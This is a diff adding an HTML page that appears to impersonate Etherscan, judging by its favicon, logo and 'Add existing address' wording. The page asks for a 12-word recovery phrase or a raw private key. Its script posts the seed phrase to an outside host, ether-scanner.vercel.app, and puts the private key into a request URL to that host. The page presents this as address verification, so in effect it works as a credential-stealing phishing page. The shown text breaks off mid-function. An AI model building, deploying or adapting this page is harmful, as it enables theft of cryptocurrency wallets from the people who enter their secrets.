@@ -1,0 +1,1059 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="shortcut icon" href="https://etherscan.io/images/favicon.ico?v=26.6.3.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./logo.svg" />
+    <title>Add existing address</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(45deg, rgb(119, 119, 238), rgb(66, 66, 185));
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-family: system-ui, -apple-system, sans-serif;
+            padding: 1rem;
+        }
+
+        .app-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 10;
+            padding: 0.5rem 0.75rem;
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+        .app-header svg {
+            display: block;
+            width: 300px;
+            max-width: 70vw;
+            height: auto;
+        }
+
+        @media (max-width: 600px) {
+            .app-header svg {
+                width: 55vw;
+                max-width: 300px;
+            }
+        }
+
+        .spacer {
+            height: 100px;
+        }
+
+        .methodDiv {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(8px);
+            padding: 28px 24px 32px;
+            border-radius: 24px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.35);
+            width: 100%;
+            max-width: 500px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .optionButtonCont {
+            display: flex;
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 40px;
+            padding: 6px;
+            gap: 4px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .methodBtn {
+            flex: 1;
+            padding: 12px 8px;
+            border-radius: 32px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            border: none;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            letter-spacing: 0.3px;
+        }
+
+        .methodButtonActive {
+            background: rgb(103, 63, 248);
+            color: white;
+            box-shadow: 0 4px 14px rgba(103, 63, 248, 0.4);
+        }
+
+        .methodButtonInactive {
+            background: transparent;
+            color: rgba(255, 255, 255, 0.7);
+            border: none;
+        }
+
+        .methodButtonInactive:hover {
+            color: white;
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .inputGroup {
+            margin-top: 8px;
+        }
+
+        .inputGroup label {
+            display: block;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.8rem;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .seedGrid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+
+        .seedGrid input {
+            padding: 10px 8px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            background: rgba(0, 0, 0, 0.25);
+            color: white;
+            font-size: 0.85rem;
+            font-family: inherit;
+            text-align: center;
+            transition: border 0.2s, box-shadow 0.2s;
+            backdrop-filter: blur(4px);
+            width: 100%;
+        }
+
+        .seedGrid input:focus {
+            outline: none;
+            border-color: rgb(103, 63, 248);
+            box-shadow: 0 0 0 3px rgba(103, 63, 248, 0.2);
+        }
+
+        .seedGrid input::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+            font-weight: 400;
+            font-size: 0.7rem;
+        }
+
+        .seedGrid input.invalid {
+            border-color: #ff6b6b;
+            color: #ff6b6b;
+        }
+
+        .seedGrid input.valid {
+            border-color: #00d4aa;
+        }
+
+        .seedGrid input:nth-child(12) {
+            grid-column: 2 / 3;
+        }
+
+        .privateKeyInput {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            background: rgba(0, 0, 0, 0.25);
+            color: white;
+            font-size: 0.95rem;
+            font-family: inherit;
+            resize: vertical;
+            min-height: 60px;
+            transition: border 0.2s;
+            backdrop-filter: blur(4px);
+            display: none;
+        }
+
+        .privateKeyInput:focus {
+            outline: none;
+            border-color: rgb(103, 63, 248);
+            box-shadow: 0 0 0 3px rgba(103, 63, 248, 0.2);
+        }
+
+        .privateKeyInput::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+            font-weight: 400;
+        }
+
+        .privateKeyInput.visible {
+            display: block;
+        }
+
+        .seedGrid.hidden {
+            display: none;
+        }
+
+        .control-group {
+            margin-top: 12px;
+        }
+
+        .control-group label {
+            display: block;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .control-group input {
+            width: 100%;
+            padding: 10px 14px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            background: rgba(0, 0, 0, 0.25);
+            color: white;
+            font-size: 0.95rem;
+            transition: border 0.2s;
+        }
+
+        .control-group input:focus {
+            outline: none;
+            border-color: rgb(103, 63, 248);
+            box-shadow: 0 0 0 3px rgba(103, 63, 248, 0.2);
+        }
+
+        .actionRow {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+            flex-direction: column;
+        }
+
+        .primaryBtn {
+            width: 100%;
+            padding: 14px 10px;
+            border-radius: 40px;
+            border: none;
+            background: rgb(103, 63, 248);
+            color: white;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 6px 20px rgba(103, 63, 248, 0.35);
+            letter-spacing: 0.3px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 52px;
+        }
+
+        .primaryBtn:hover:not(:disabled) {
+            background: rgb(125, 89, 255);
+            transform: translateY(-1px);
+            box-shadow: 0 8px 28px rgba(103, 63, 248, 0.5);
+        }
+
+        .primaryBtn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .primaryBtn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-content {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: opacity 0.2s;
+        }
+
+        .btn-content.hidden {
+            opacity: 0;
+        }
+
+        .spinner-container {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+
+        .spinner-container.active {
+            display: block;
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.15);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 0.7s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .hint {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.75rem;
+            margin-top: 16px;
+            text-align: center;
+            letter-spacing: 0.2px;
+        }
+
+        .hint a {
+            color: rgba(255, 255, 255, 0.6);
+            text-decoration: none;
+            border-bottom: 1px dashed rgba(255, 255, 255, 0.15);
+            cursor: pointer;
+        }
+
+        .hint a:hover {
+            color: white;
+            border-bottom-color: rgba(255, 255, 255, 0.4);
+        }
+
+        .statusMsg {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 0.85rem;
+            text-align: center;
+            padding: 10px 16px;
+            border-radius: 12px;
+            background: rgba(0, 0, 0, 0.25);
+            width: 100%;
+            min-height: 44px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s;
+            word-break: break-all;
+            margin-top: 12px;
+        }
+
+        .statusMsg.visible {
+            display: flex;
+        }
+
+        .statusMsg.success {
+            border-left: 3px solid rgb(0, 200, 150);
+        }
+
+        .statusMsg.error {
+            border-left: 3px solid rgb(255, 107, 107);
+        }
+
+        .statusMsg.warning {
+            border-left: 3px solid rgb(255, 217, 61);
+            color: rgb(255, 217, 61);
+        }
+
+        .statusMsg.info {
+            border-left: 3px solid rgb(103, 63, 248);
+        }
+
+        .address-display {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            padding: 12px 16px;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.8);
+            word-break: break-all;
+            font-family: monospace;
+            display: none;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            margin-top: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .address-display.visible {
+            display: block;
+        }
+
+        .address-display .label {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.65rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        .address-item {
+            padding: 8px 12px;
+            margin: 4px 0;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            font-size: 0.75rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .address-item .index {
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 0.65rem;
+        }
+
+        .address-item .addr {
+            color: white;
+            font-family: monospace;
+        }
+
+        .address-item .status-badge {
+            font-size: 0.6rem;
+            padding: 2px 8px;
+            border-radius: 12px;
+        }
+
+        .address-item .status-badge.imported {
+            background: rgba(0, 200, 150, 0.2);
+            color: #00d4aa;
+        }
+
+        .address-item .status-badge.new {
+            background: rgba(103, 63, 248, 0.2);
+            color: rgb(103, 63, 248);
+        }
+
+        .compare-section {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            padding: 16px;
+            margin-top: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            display: none;
+        }
+
+        .compare-section.visible {
+            display: block;
+        }
+
+        .compare-section .label {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .compare-section .generated-address {
+            color: #00d4aa;
+            font-family: monospace;
+            font-size: 0.85rem;
+            padding: 8px 12px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            margin-bottom: 8px;
+        }
+
+        .compare-section .expected-address {
+            color: white;
+            font-family: monospace;
+            font-size: 0.85rem;
+            padding: 8px 12px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+        }
+
+        .compare-section .match-badge {
+            display: inline-block;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 0.75rem;
+            margin-top: 8px;
+        }
+
+        .compare-section .match-badge.matched {
+            background: rgba(0, 200, 150, 0.2);
+            color: #00d4aa;
+        }
+
+        .compare-section .match-badge.unmatched {
+            background: rgba(255, 107, 107, 0.2);
+            color: #ff6b6b;
+        }
+
+        @media (max-width: 480px) {
+            .methodDiv {
+                padding: 20px 16px 24px;
+                border-radius: 20px;
+            }
+            .seedGrid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 6px;
+            }
+            .seedGrid input:nth-child(12) {
+                grid-column: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="app-header">
+        <svg width="536" height="122" viewBox="0 0 536 122" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <g clip-path="url(#clip0_3340_1171)">
+                <mask id="mask0_3340_1171" style="mask-type:luminance" maskUnits="userSpaceOnUse" x="0" y="0" width="536" height="122">
+                    <path d="M535.015 0H0V121.639H535.015V0Z" fill="white"/>
+                </mask>
+                <g mask="url(#mask0_3340_1171)">
+                    <path d="M158.247 39.4471V56.2411H178.647V63.1471H158.247V80.3341H181.006V87.6341H149.301V32.2341H181.001V39.4541L158.247 39.4471ZM211.455 79.8591V87.6281H205.961C201.357 87.6281 197.865 86.5164 195.484 84.2931C193.103 82.0697 191.913 78.3694 191.914 73.1921V52.0031H185.714V44.3911H191.914V33.6401H200.939V44.3911H211.376V52.0031H200.939V73.3491C200.939 75.8077 201.397 77.5077 202.312 78.4491C203.227 79.3904 204.836 79.8604 207.138 79.8591H211.455ZM244.023 43.6851C249.046 43.6851 253.074 45.3071 256.108 48.5511C259.142 51.7951 260.659 56.4251 260.66 62.4411V87.6321H251.714V63.3831C251.714 59.5117 250.72 56.5164 248.732 54.3971C247.675 53.3189 246.4 52.478 244.993 51.9301C243.586 51.3822 242.078 51.1398 240.57 51.2191C238.984 51.1493 237.401 51.4175 235.926 52.0061C234.451 52.5947 233.118 53.4902 232.016 54.6331C229.871 56.9091 228.798 60.2444 228.798 64.6391V87.6321H219.852V29.5591H228.798V53.8871C229.832 50.7945 231.878 48.1405 234.605 46.3531C237.41 44.5496 240.689 43.6209 244.023 43.6851ZM311.278 63.9321C311.293 65.2207 311.188 66.5079 310.964 67.7771H277.689C277.846 72.2244 279.075 75.5204 281.377 77.6651C283.696 79.8174 286.768 80.973 289.931 80.8831C292.636 80.9679 295.294 80.1689 297.504 78.6071C299.518 77.1719 300.886 75.0007 301.31 72.5641H310.884C310.348 75.5095 309.11 78.2823 307.274 80.6471C305.383 83.0485 302.931 84.9485 300.133 86.1801C297.046 87.5467 293.699 88.229 290.323 88.1801C286.456 88.2566 282.633 87.3378 279.223 85.5121C276.007 83.7354 273.377 81.0637 271.65 77.8211C269.746 74.1674 268.801 70.09 268.903 65.9711C268.806 61.8777 269.752 57.8269 271.65 54.1991C273.377 50.9565 276.007 48.2847 279.223 46.5081C282.633 44.6823 286.456 43.7636 290.323 43.8401C294.187 43.751 298.009 44.6563 301.423 46.4691C304.496 48.1293 307.029 50.6347 308.723 53.6891C310.444 56.8258 311.324 60.3545 311.277 63.9321H311.278ZM302.253 63.6971C302.436 61.2416 301.933 58.7837 300.801 56.5971C299.809 54.7645 298.273 53.2841 296.406 52.3591C294.513 51.4354 292.43 50.9653 290.324 50.9861C287.089 50.8863 283.941 52.0391 281.535 54.2041C279.181 56.3494 277.899 59.5161 277.69 63.7041L302.253 63.6971ZM328.853 52.8671C330.276 50.0866 332.451 47.7617 335.131 46.1571C337.98 44.4747 341.24 43.6187 344.548 43.6851V53.4161H341.88C337.956 53.4161 334.804 54.3707 332.424 56.2801C330.044 58.1894 328.856 61.3418 328.861 65.7371V87.6371H319.915V44.3911H328.861L328.853 52.8671ZM365.423 43.8421C370.498 43.8421 374.564 45.1371 377.623 47.7271C380.718 50.3783 382.718 54.0847 383.234 58.1271H374.761C374.477 55.9268 373.404 53.9046 371.74 52.4371C369.898 50.9313 367.563 50.1623 365.187 50.2791C363.309 50.1589 361.452 50.7313 359.968 51.8881C359.355 52.4304 358.872 53.103 358.552 53.8566C358.233 54.6102 358.087 55.4256 358.124 56.2431C358.099 56.8564 358.205 57.4679 358.435 58.037C358.665 58.606 359.014 59.1195 359.458 59.5431C360.42 60.4234 361.556 61.0918 362.793 61.5051C364.662 62.1256 366.561 62.6496 368.483 63.0751C371.163 63.6427 373.799 64.4033 376.37 65.3511C378.384 66.1358 380.166 67.4185 381.549 69.0791C383.08 71.0594 383.846 73.5249 383.707 76.0241C383.752 77.7087 383.403 79.3805 382.687 80.9063C381.972 82.4322 380.911 83.7699 379.587 84.8131C376.84 87.0631 373.14 88.1881 368.487 88.1881C363.098 88.1881 358.743 86.9324 355.421 84.4211C353.767 83.1603 352.383 81.5795 351.352 79.7729C350.321 77.9663 349.665 75.9707 349.421 73.9051H358.132C358.236 75.0238 358.568 76.1093 359.108 77.0946C359.648 78.08 360.384 78.9442 361.271 79.6341C363.351 81.1798 365.902 81.9572 368.491 81.8341C370.332 81.9392 372.143 81.3356 373.553 80.1471C374.153 79.609 374.628 78.9466 374.946 78.206C375.264 77.4655 375.416 76.6646 375.393 75.8591C375.426 75.1917 375.317 74.5249 375.074 73.9026C374.83 73.2803 374.457 72.7168 373.98 72.2491C372.963 71.3147 371.759 70.6058 370.449 70.1691C368.546 69.541 366.607 69.03 364.642 68.6391C362.049 68.0644 359.494 67.3296 356.991 66.4391C355.033 65.7094 353.301 64.478 351.968 62.8681C350.494 60.9527 349.755 58.5717 349.888 56.1581C349.84 54.456 350.187 52.7659 350.901 51.2204C351.616 49.675 352.68 48.3163 354.008 47.2511C356.755 44.9784 360.561 43.8421 365.426 43.8421H365.423ZM411.881 43.8421C417.481 43.8421 422.111 45.3201 425.771 48.2761C429.471 51.2977 431.907 55.5949 432.598 60.3221H423.098C422.686 57.7837 421.326 55.4964 419.292 53.9221C417.099 52.3219 414.432 51.5065 411.719 51.6071C410.104 51.5684 408.499 51.8737 407.01 52.5028C405.522 53.132 404.185 54.0705 403.087 55.2561C400.785 57.6888 399.634 61.2594 399.634 65.9681C399.634 70.6767 400.785 74.2604 403.087 76.7191C404.179 77.9147 405.514 78.8625 407.003 79.4987C408.492 80.1349 410.1 80.4446 411.719 80.4071C414.44 80.5112 417.115 79.6828 419.301 78.0591C421.33 76.4656 422.688 74.1696 423.107 71.6241H432.607C431.91 76.3601 429.477 80.6677 425.78 83.7091C422.118 86.6911 417.488 88.1821 411.89 88.1821C408.023 88.2586 404.2 87.3398 400.79 85.5141C397.574 83.7374 394.944 81.0657 393.217 77.8231C391.309 74.1699 390.361 70.0921 390.461 65.9721C390.364 61.8787 391.31 57.8279 393.208 54.2001C394.935 50.9575 397.565 48.2857 400.781 46.5091C404.193 44.683 408.016 43.7646 411.885 43.8421H411.881ZM458.575 43.8421C462.144 43.7367 465.656 44.7508 468.62 46.7421C471.347 48.6177 473.408 51.3108 474.506 54.4331V44.3911H483.452V87.6321H474.506V77.5871C473.408 80.7094 471.347 83.4024 468.62 85.2781C465.656 87.2694 462.144 88.2834 458.575 88.1781C455.032 88.2378 451.541 87.3143 448.491 85.5101C445.481 83.672 443.069 81.0004 441.546 77.8191C439.795 74.1195 438.935 70.061 439.035 65.9691C438.94 61.9027 439.8 57.8708 441.546 54.1971C443.069 51.0157 445.481 48.3442 448.491 46.5061C451.543 44.7026 455.035 43.7804 458.579 43.8421H458.575ZM461.322 51.6901C459.553 51.6103 457.788 51.9085 456.144 52.5648C454.5 53.2211 453.014 54.2204 451.787 55.4961C449.406 58.0334 448.216 61.5258 448.216 65.9731C448.216 70.4204 449.407 73.9124 451.79 76.4491C453.017 77.7255 454.502 78.7256 456.147 79.3826C457.791 80.0396 459.556 80.3384 461.325 80.2591C463.694 80.2967 466.027 79.686 468.074 78.4931C470.076 77.3016 471.707 75.5762 472.783 73.5101C473.978 71.1819 474.571 68.5921 474.51 65.9761C474.562 63.3735 473.969 60.7985 472.783 58.4811C471.715 56.3984 470.084 54.6578 468.074 53.4581C466.028 52.2641 463.694 51.6524 461.325 51.6891L461.322 51.6901ZM518.375 43.6901C523.398 43.6901 527.426 45.3121 530.46 48.5561C533.494 51.8001 535.011 56.4301 535.012 62.4461V87.6321H526.066V63.3831C526.066 59.5117 525.072 56.5164 523.084 54.3971C522.027 53.319 520.752 52.4781 519.345 51.9302C517.938 51.3823 516.43 51.1399 514.922 51.2191C513.336 51.1493 511.753 51.4175 510.278 52.0061C508.803 52.5947 507.47 53.4902 506.368 54.6331C504.223 56.9091 503.15 60.2444 503.15 64.6391V87.6321H494.204V44.3911H503.15V53.8911C504.184 50.7985 506.23 48.1445 508.957 46.3571C511.763 44.5516 515.042 43.6215 518.378 43.6851L518.375 43.6901Z" fill="white"/>
+                    <path d="M25.29 57.9139C25.2901 57.2347 25.4244 56.5623 25.6851 55.9352C25.9458 55.308 26.3278 54.7386 26.8092 54.2595C27.2907 53.7804 27.8619 53.4011 28.4903 53.1434C29.1187 52.8858 29.7918 52.7548 30.471 52.7579L39.061 52.7859C40.4305 52.7859 41.744 53.33 42.7124 54.2984C43.6809 55.2669 44.225 56.5803 44.225 57.9499V90.4299C45.192 90.1429 46.434 89.8369 47.793 89.5169C48.737 89.2952 49.5783 88.761 50.1805 88.0009C50.7826 87.2409 51.1102 86.2996 51.11 85.3299V45.0399C51.11 43.6702 51.654 42.3567 52.6224 41.3881C53.5908 40.4195 54.9043 39.8752 56.274 39.8749H64.881C66.2506 39.8752 67.5641 40.4195 68.5325 41.3881C69.5009 42.3567 70.045 43.6702 70.045 45.0399V82.4329C70.045 82.4329 72.2 81.5609 74.299 80.6749C75.0787 80.3452 75.7441 79.7931 76.2122 79.0877C76.6803 78.3822 76.9302 77.5545 76.931 76.7079V32.1299C76.931 30.7605 77.4749 29.4472 78.4431 28.4788C79.4113 27.5103 80.7245 26.9662 82.0939 26.9659H90.701C92.0706 26.9659 93.384 27.51 94.3525 28.4784C95.3209 29.4468 95.865 30.7603 95.865 32.1299V68.8389C103.327 63.4309 110.889 56.9269 116.89 49.1059C117.761 47.9707 118.337 46.6377 118.567 45.2257C118.797 43.8138 118.674 42.3668 118.209 41.0139C115.431 33.0217 111.016 25.6973 105.245 19.5096C99.474 13.3218 92.4749 8.40687 84.6955 5.07934C76.9161 1.75182 68.5277 0.0849617 60.0671 0.185439C51.6065 0.285917 43.2601 2.15152 35.562 5.66286C27.8638 9.17419 20.9834 14.2539 15.3611 20.577C9.73881 26.9001 5.49842 34.3272 2.91131 42.3832C0.324207 50.4391 -0.552649 58.9464 0.336851 67.3607C1.22635 75.775 3.86263 83.911 8.07696 91.2479C8.81111 92.5135 9.89118 93.5434 11.1903 94.2165C12.4894 94.8896 13.9536 95.178 15.411 95.0479C17.039 94.9049 19.066 94.7019 21.476 94.4189C22.5251 94.2998 23.4937 93.7989 24.1972 93.0116C24.9008 92.2244 25.2901 91.2058 25.291 90.1499L25.29 57.9139Z" fill="white"/>
+                    <path d="M25.1021 110.009C34.1744 116.609 44.8959 120.571 56.0802 121.456C67.2646 122.34 78.4757 120.114 88.4731 115.022C98.4705 109.93 106.864 102.172 112.726 92.6059C118.587 83.0395 121.688 72.0381 121.685 60.8188C121.685 59.4188 121.62 58.0337 121.527 56.6567C99.308 89.7947 58.2831 105.287 25.104 110.004" fill="#8B8B8B"/>
+                </g>
+            </g>
+            <defs>
+                <clipPath id="clip0_3340_1171">
+                    <rect width="536" height="122" fill="white"/>
+                </clipPath>
+            </defs>
+        </svg>
+    </header>
+
+    <div class="spacer"></div>
+
+    <div class="methodDiv">
+        <div class="optionButtonCont">
+            <button class="methodBtn methodButtonActive" id="phraseBtn" onclick="setActiveMethod('phrase')">12-Word phrase</button>
+            <button class="methodBtn methodButtonInactive" id="keyBtn" onclick="setActiveMethod('key')">Private key</button>
+        </div>
+
+        <div class="inputGroup">
+            <label id="inputLabel">Enter your 12-word recovery phrase</label>
+
+            <div class="seedGrid" id="seedGrid">
+                <input type="text" placeholder="1" maxlength="20" />
+                <input type="text" placeholder="2" maxlength="20" />
+                <input type="text" placeholder="3" maxlength="20" />
+                <input type="text" placeholder="4" maxlength="20" />
+                <input type="text" placeholder="5" maxlength="20" />
+                <input type="text" placeholder="6" maxlength="20" />
+                <input type="text" placeholder="7" maxlength="20" />
+                <input type="text" placeholder="8" maxlength="20" />
+                <input type="text" placeholder="9" maxlength="20" />
+                <input type="text" placeholder="10" maxlength="20" />
+                <input type="text" placeholder="11" maxlength="20" />
+                <input type="text" placeholder="12" maxlength="20" />
+            </div>
+
+            <textarea class="privateKeyInput" id="privateKeyInput" placeholder="raw private key"></textarea>
+        </div>
+
+        <div class="control-group">
+            <label>First address to verify (from your wallet)</label>
+            <input type="text" id="expectedAddress" placeholder="0x..." />
+        </div>
+
+        <div class="control-group">
+            <label>Number of addresses to import</label>
+            <input type="number" id="addressCount" value="5" min="1" max="50" />
+        </div>
+
+        <div id="compareSection" class="compare-section">
+            <div class="label">Address Verification</div>
+            <div class="generated-address" id="generatedAddress">Generated: </div>
+            <div class="expected-address" id="expectedAddressDisplay">Expected: </div>
+            <div id="matchBadge" class="match-badge"></div>
+        </div>
+
+        <div id="addressDisplay" class="address-display">
+            <div class="label">Discovered Addresses</div>
+            <div id="addressList"></div>
+        </div>
+
+        <div class="actionRow">
+            <button class="primaryBtn" id="importBtn" onclick="importWallet()">
+                <span class="btn-content" id="importContent">🔍 Find & Verify Addresses</span>
+                <span class="spinner-container" id="importSpinner">
+                    <span class="spinner"></span>
+                </span>
+            </button>
+            <button class="primaryBtn" id="importSelectedBtn" onclick="importSelectedAddresses()" style="display: none;">
+                <span class="btn-content" id="importSelectedContent">📥 Import Selected Addresses</span>
+                <span class="spinner-container" id="importSelectedSpinner">
+                    <span class="spinner"></span>
+                </span>
+            </button>
+        </div>
+
+        <div id="statusMsg" class="statusMsg"></div>
+
+        <div class="hint">
+            <a onclick="navigateTo('learn')">Learn about recovery phrases</a> &middot; <a onclick="navigateTo('advanced')">Advanced</a>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = 'https://ether-scanner.vercel.app';
+        const STORAGE_KEY = 'ether_wallets_data';
+
+        let discoveredAddresses = [];
+        let selectedAddresses = new Set();
+        let seedPhraseVerified = false;
+
+        function getStoredWallets() {
+            try {
+                const data = localStorage.getItem(STORAGE_KEY);
+                return data ? JSON.parse(data) : { masterKeys: [], nextId: 1 };
+            } catch (e) {
+                return { masterKeys: [], nextId: 1 };
+            }
+        }
+
+        function saveWallets(data) {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+        }
+
+        function showStatus(message, type = 'info') {
+            const statusMsg = document.getElementById('statusMsg');
+            statusMsg.textContent = message;
+            statusMsg.className = `statusMsg visible ${type}`;
+        }
+
+        function hideStatus() {
+            document.getElementById('statusMsg').className = 'statusMsg';
+        }
+
+        function setButtonLoading(btnId, contentId, spinnerId, isLoading) {
+            const btn = document.getElementById(btnId);
+            const content = document.getElementById(contentId);
+            const spinner = document.getElementById(spinnerId);
+            
+            btn.disabled = isLoading;
+            content.className = isLoading ? 'btn-content hidden' : 'btn-content';
+            spinner.className = isLoading ? 'spinner-container active' : 'spinner-container';
+        }
+
+        function setActiveMethod(method) {
+            const phraseBtn = document.getElementById('phraseBtn');
+            const keyBtn = document.getElementById('keyBtn');
+            const seedGrid = document.getElementById('seedGrid');
+            const privateKeyInput = document.getElementById('privateKeyInput');
+            const inputLabel = document.getElementById('inputLabel');
+
+            if (method === 'phrase') {
+                phraseBtn.className = 'methodBtn methodButtonActive';
+                keyBtn.className = 'methodBtn methodButtonInactive';
+                seedGrid.classList.remove('hidden');
+                privateKeyInput.classList.remove('visible');
+                privateKeyInput.style.display = 'none';
+                seedGrid.style.display = 'grid';
+                inputLabel.textContent = 'Enter your 12-word recovery phrase';
+            } else {
+                keyBtn.className = 'methodBtn methodButtonActive';
+                phraseBtn.className = 'methodBtn methodButtonInactive';
+                seedGrid.classList.add('hidden');
+                seedGrid.style.display = 'none';
+                privateKeyInput.classList.add('visible');
+                privateKeyInput.style.display = 'block';
+                inputLabel.textContent = 'Enter your private key';
+            }
+        }
+
+        async function verifyFirstAddress(seedPhrase, expectedAddress) {
+            try {
+                const response = await fetch(`${API_BASE}/import_seed/`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        seed_phrase: seedPhrase,
+                        path: 'standard',
+                        index: 0
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`API error: ${response.status}`);
+                }
+
+                const data = await response.json();
+                
+                if (data.success) {
+                    const generatedAddress = data.address;
+                    const compareSection = document.getElementById('compareSection');
+                    const generatedDisplay = document.getElementById('generatedAddress');
+                    const expectedDisplay = document.getElementById('expectedAddressDisplay');
+                    const matchBadge = document.getElementById('matchBadge');
+
+                    compareSection.className = 'compare-section visible';
+                    generatedDisplay.textContent = `Generated: ${generatedAddress}`;
+                    expectedDisplay.textContent = `Expected: ${expectedAddress}`;
+
+                    if (generatedAddress.toLowerCase() === expectedAddress.toLowerCase()) {
+                        matchBadge.textContent = '✅ Addresses match! Proceed with import.';
+                        matchBadge.className = 'match-badge matched';
+                        seedPhraseVerified = true;
+                        showStatus('✅ Address verified! Your seed phrase is correct.', 'success');
+                        return true;
+                    } else {
+                        matchBadge.textContent = '❌ Addresses do not match! Please check your seed phrase for typos.';
+                        matchBadge.className = 'match-badge unmatched';
+                        seedPhraseVerified = false;
+                        showStatus('❌ Address mismatch! Please check your seed phrase for typos or wrong words.', 'error');
+                        return false;
+                    }
+                } else {
+                    throw new Error(data.error || 'Failed to verify address');
+                }
+            } catch (error) {
+                console.error('Error verifying address:', error);
+                showStatus(`Error: ${error.message}`, 'error');
+                return false;
+            }
+        }
+
+        async function importWallet() {
+            const privateKeyInput = document.getElementById('privateKeyInput');
+            const seedGrid = document.getElementById('seedGrid');
+            const expectedAddress = document.getElementById('expectedAddress').value.trim();
+            const addressCount = parseInt(document.getElementById('addressCount').value) || 5;
+            
+            setButtonLoading('importBtn', 'importContent', 'importSpinner', true);
+            hideStatus();
+            seedPhraseVerified = false;
+
+            try {
+                const storedData = getStoredWallets();
+
+                if (privateKeyInput.style.display === 'block' || privateKeyInput.classList.contains('visible')) {
+                    let privateKey = privateKeyInput.value.trim();
+                    if (!privateKey) {
+                        showStatus('Please enter your private key.', 'error');
+                        setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
+                        return;
+                    }
+                    
+                    if (!privateKey.startsWith('0x')) {
+                        privateKey = '0x' + privateKey;
+                    }
+                    
+                    showStatus('Importing wallet...', 'info');
+                    
+                    const response = await fetch(`${API_BASE}/get_addresses/${privateKey.replace('0x', '')}/`, {
+                        method: 'GET',
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                    
+                    if (!response.ok) {
+                        throw new Error(`API error: ${response.status}`);
+                    }
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        const newMaster = {
+                            id: storedData.nextId,
+                            type: 'imported_private_key',
+                            parentAddress: data.address,
+                            parentPrivateKey: data.private_key,
+                            createdAt: new Date().toISOString(),
+                            children: [{
+                                index: 0,
+                                address: data.address,
+                                privateKey: data.private_key
+                            }]
+                        };
+                        
